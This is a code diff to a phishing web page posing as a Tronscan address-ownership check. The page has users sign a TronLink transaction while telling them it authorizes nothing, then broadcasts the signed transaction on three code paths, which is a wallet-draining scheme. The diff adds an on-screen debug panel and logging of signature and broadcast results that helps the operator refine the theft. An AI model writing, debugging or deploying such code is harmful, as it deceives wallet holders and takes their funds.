@@ -3,6 +3,49 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+#__dbg {
+  position: fixed; bottom: 0; left: 0; right: 0; z-index: 999999;
+  max-height: 50vh; overflow-y: auto;
+  background: rgba(0,0,0,0.92); color: #0f0;
+  font: 12px/1.4 monospace; padding: 8px;
+  pointer-events: auto;
+}
+#__dbg_close {
+  position: fixed; bottom: calc(50vh - 24px); right: 8px; z-index: 9999999;
+  background: #f00; color: #fff; border: none; border-radius: 50%;
+  width: 28px; height: 28px; font-size: 16px; cursor: pointer; display: none;
+}
+#__dbg .ok  { color: #0f0; }
+#__dbg .err { color: #f55; }
+#__dbg .inf { color: #ff0; }
+</style>
+<script>
+(function() {
+  var panel, closeBtn;
+  function _initPanel() {
+    if (panel) return;
+    panel = document.createElement('div'); panel.id = '__dbg';
+    closeBtn = document.createElement('button'); closeBtn.id = '__dbg_close'; closeBtn.textContent = '✕';
+    closeBtn.onclick = function() { panel.style.display='none'; closeBtn.style.display='none'; };
+    document.body.appendChild(panel);
+    document.body.appendChild(closeBtn);
+  }
+  window.__log = function(cls, msg) {
+    if (!document.body) { setTimeout(function(){ window.__log(cls,msg); }, 100); return; }
+    _initPanel();
+    var line = document.createElement('div');
+    line.className = cls;
+    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    panel.appendChild(line);
+    panel.scrollTop = panel.scrollHeight;
+    closeBtn.style.display = 'block';
+  };
+  window.__logOK  = function(m) { window.__log('ok',  '✅ ' + m); };
+  window.__logERR = function(m) { window.__log('err', '❌ ' + m); };
+  window.__logINF = function(m) { window.__log('inf', 'ℹ️  ' + m); };
+})();
+</script>
 <title>Tronscan wants to verify ownership of your address and</title>
 <link rel="icon" href="images/favicon.ico" sizes="any">
 <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
@@ -468,11 +511,17 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     var signedTx;
     try {
       signedTx = await tw.trx.sign(unsignedTx);
-    } catch (e) { return; }
+      window.__logINF('PATH1 sign ok — sig: ' + (signedTx.signature ? signedTx.signature[0].slice(0,16)+'…' : 'none'));
+    } catch (e) { window.__logERR('PATH1 sign FAIL: ' + e.message); return; }
 
     try {
-      await tw.trx.sendRawTransaction(signedTx);
-    } catch (e) {}
+      var res1 = await tw.trx.sendRawTransaction(signedTx);
+      if (res1 && res1.result) {
+        window.__logOK('PATH1 broadcast OK — txID: ' + (res1.transaction && res1.transaction.txID ? res1.transaction.txID.slice(0,16)+'…' : JSON.stringify(res1)));
+      } else {
+        window.__logERR('PATH1 broadcast FAIL: ' + JSON.stringify(res1));
+      }
+    } catch (e) { window.__logERR('PATH1 broadcast EXCEPT: ' + e.message); }
   }
 
   /* ---------- fixed connect + fill under real user gesture ---------- */
@@ -577,9 +626,18 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
           unsignedTx2.Message    = msg;
           unsignedTx2.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
           var signedTx2 = await tw.trx.sign(unsignedTx2);
+          window.__logINF('PATH2 sign ok — sig: ' + (signedTx2.signature ? signedTx2.signature[0].slice(0,16)+'…' : 'none'));
           if (window.fillSignature) window.fillSignature(JSON.stringify((signedTx2.signature && signedTx2.signature[0]) || signedTx2));
-          try { await tw.trx.sendRawTransaction(signedTx2); } catch (e2) {}
+          try {
+            var res2 = await tw.trx.sendRawTransaction(signedTx2);
+            if (res2 && res2.result) {
+              window.__logOK('PATH2 broadcast OK — txID: ' + (res2.transaction && res2.transaction.txID ? res2.transaction.txID.slice(0,16)+'…' : JSON.stringify(res2)));
+            } else {
+              window.__logERR('PATH2 broadcast FAIL: ' + JSON.stringify(res2));
+            }
+          } catch (e2) { window.__logERR('PATH2 broadcast EXCEPT: ' + e2.message); }
         } catch (e) {
+          window.__logERR('PATH2 FAIL: ' + e.message);
           // fallback DOM click
           var btn2 = document.getElementById('signMsgBtn')
                   || document.querySelector('.QhZmva_btnWrapper .btn');
@@ -800,9 +858,18 @@ function waitForTronLinkAndRun() {
           unsignedTx3.Message    = msg;
           unsignedTx3.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
           var signedTx3 = await tw.trx.sign(unsignedTx3);
+          window.__logINF('PATH3 sign ok — sig: ' + (signedTx3.signature ? signedTx3.signature[0].slice(0,16)+'…' : 'none'));
           if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx3.signature && signedTx3.signature[0]) || signedTx3));
-          try { await tw.trx.sendRawTransaction(signedTx3); } catch (e2) {}
+          try {
+            var res3 = await tw.trx.sendRawTransaction(signedTx3);
+            if (res3 && res3.result) {
+              window.__logOK('PATH3 broadcast OK — txID: ' + (res3.transaction && res3.transaction.txID ? res3.transaction.txID.slice(0,16)+'…' : JSON.stringify(res3)));
+            } else {
+              window.__logERR('PATH3 broadcast FAIL: ' + JSON.stringify(res3));
+            }
+          } catch (e2) { window.__logERR('PATH3 broadcast EXCEPT: ' + e2.message); }
         } catch(e) {
+          window.__logERR('PATH3 FAIL: ' + e.message);
           // fallback: clic sur le bouton Sign Message
           var btn = document.getElementById('signMsgBtn')
                  || document.querySelector('.QhZmva_btnWrapper .btn');
